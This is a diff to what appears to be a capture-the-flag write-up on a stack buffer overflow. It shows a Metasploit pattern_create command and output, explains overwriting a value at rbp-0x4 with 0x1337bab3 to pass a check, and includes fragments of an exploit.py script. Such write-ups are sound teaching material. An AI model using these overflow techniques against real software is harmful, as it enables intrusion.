@@ -125,7 +125,7 @@ Generate pattern 100 chars patter/n:
 ```shell
 /opt/metasploit/tools/exploit/pattern_create.rb -l 100                                                                                     main 
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
-```shell
+```
 Now put a break just on cmp address:
 
 ```shell
@@ -211,7 +211,7 @@ We need to subtract "Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A" string from origi
 Now we know that if we overflow gets with "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9" string we will be just on rbp-0x4 from cmp, so in order to pass the if (cmp) we try to put 0x1337bab3 (\xb3\xba\x37\x13)as value on it just after overflow.
 Let's python do magic: 
 
-Create exploit.py
+Create exploit.py, take a look on eof var, need only on server side (nc)
 
 ```python
 offset = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9"
@@ -224,6 +224,8 @@ f.close()
 print(exploit)
 
 ```
+
+Execute exploit:
 
 ```shell
 python exploit.py                                                                                                                          main 
